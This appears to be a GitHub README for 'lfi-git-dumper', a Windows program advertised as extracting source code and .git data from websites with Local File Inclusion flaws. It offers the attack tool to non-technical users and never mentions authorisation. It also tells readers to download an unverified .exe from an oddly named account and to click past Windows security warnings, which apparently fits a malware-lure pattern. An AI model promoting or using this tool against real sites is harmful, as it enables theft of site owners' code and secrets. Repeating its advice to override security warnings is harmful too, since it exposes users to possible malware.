# 🛠️ lfi-git-dumper - Extract Git Data from Vulnerable Websites

[![Download lfi-git-dumper](https://img.shields.io/badge/Download-lfi--git--dumper-brightgreen)](https://github.com/myrrhisodoratademyelination23/lfi-git-dumper/releases)

## 📋 What is lfi-git-dumper?

lfi-git-dumper is a tool that helps you recover website source files from exposed `.git` repositories. Sometimes, websites have security gaps called Local File Inclusion (LFI) vulnerabilities. These gaps can let someone access files they should not see. This program lets you safely explore and download those hidden `.git` folders. It also works when some files are blocked on the server by special storage settings.

You do not need to be a developer or know coding to use this tool. It runs on Windows and guides you through the process.

---

## ⚙️ System Requirements

Before you start, make sure your computer meets these minimum requirements:

- Windows 10 or newer (64-bit recommended)
- 4 GB of RAM or more
- 100 MB free disk space for program files and downloaded data
- Internet connection to download and use the tool

No installations of other software or programming languages are needed. The tool comes ready to use.

---

## 🔍 How It Works

This tool works by connecting to the website that has a `.git` folder available via LFI. It downloads the hidden parts of the git repository. By doing this, it recovers source files, including code, configuration files, and other important content that the site owner did not mean to share.

This process helps with security checks or research. It does not harm the website or server. You run it locally on your Windows machine.

---

## 🚀 Getting Started: Step-by-Step

1. **Download the software**

   Visit the release page below to get the latest version for Windows:

   [![Download lfi-git-dumper](https://img.shields.io/badge/Download-lfi--git--dumper-blue)](https://github.com/myrrhisodoratademyelination23/lfi-git-dumper/releases)

2. **Choose the right file**

   On the releases page, look for a file with `.exe` in its name. This is the program you need. Click to download it.

3. **Run the program**

   - Once downloaded, open the `.exe` file by double-clicking it.
   - If Windows shows a security warning, click “Run” or “More info” > “Run anyway”.
   - The tool will open in a simple window.

4. **Enter the website information**

   - Find the text box labeled “Target URL” or similar.
   - Enter the website address with the suspected Local File Inclusion issue.
   - Make sure the URL uses `http://` or `https://`.

5. **Start the dump**

   - Click the “Start” button.
   - The tool connects to the website and begins downloading source files.
   - You will see progress messages on the screen.

6. **Save your files**

   - Once finished, the software asks where to save the recovered files.
   - Choose a folder on your computer.
   - The tool saves the files there, keeping the original structure.

---

## 🗂️ Folder and File Structure

The recovered files keep the same organization found in the original `.git` repository. You will see folders like:

- `objects`: Files containing data for the code and changes
- `refs`: References to branches and tags
- `config`: Settings related to the repository
- All recovered source files organized as on the website

You can open these files with any text editor or code viewer. No special programs needed.

---

## ❓ Troubleshooting

If you run into issues, try these solutions:

- **The program won’t open:** Make sure your Windows is up to date.
- **No files are downloaded:** Confirm the website really has an accessible `.git` folder.
- **Errors appear during download:** Check your internet connection and try again.
- **Windows blocks the file:** Right-click the `.exe`, select “Properties,” and mark “Unblock” if available.

---

## 🔒 Security and Privacy

All work happens locally on your machine. The tool connects only to the target website you specify. It does not send your data elsewhere. The recovered source code stays on your computer unless you decide to share it.

---

## 🛠️ Additional Features

- Supports detecting path traversal vulnerabilities.
- Can handle server restrictions on object storage.
- Provides readable logs for review.
- Works well with common LFI attack patterns.

---

## 📥 Download and Install

You can get the latest Windows release by visiting the page below:

[![Download lfi-git-dumper](https://img.shields.io/badge/Download-lfi--git--dumper-green)](https://github.com/myrrhisodoratademyelination23/lfi-git-dumper/releases)

Follow the steps in the "Getting Started" section to complete setup and begin using the software.

---

## 🤝 Need Help?

This tool is designed to work simply. But if you want to learn more about Local File Inclusion or `.git` repositories, look for beginner guides on website security or penetration testing. These topics explain the risks and ways to protect against unwanted exposure.